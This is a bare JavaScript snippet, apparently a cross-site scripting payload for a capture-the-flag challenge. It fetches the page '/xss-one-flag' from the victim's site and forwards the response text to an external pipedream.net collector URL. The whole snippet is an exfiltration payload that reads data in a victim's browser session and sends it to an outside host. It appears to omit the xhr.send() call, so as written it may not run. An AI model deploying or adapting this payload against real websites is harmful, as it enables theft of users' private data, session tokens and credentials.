var xhr = new XMLHttpRequest();
xhr.onload = function() {
    // Check if the request was successful
    if (xhr.status >= 200 && xhr.status < 300) {
        // Parse the response if needed or directly use it
        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText)
    } else {
        // Handle errors, for example, display a message or log it
        console.log('The request failed with status:', xhr.status);
    }
};

console.log("works")
xhr.open('GET','/xss-one-flag',true);


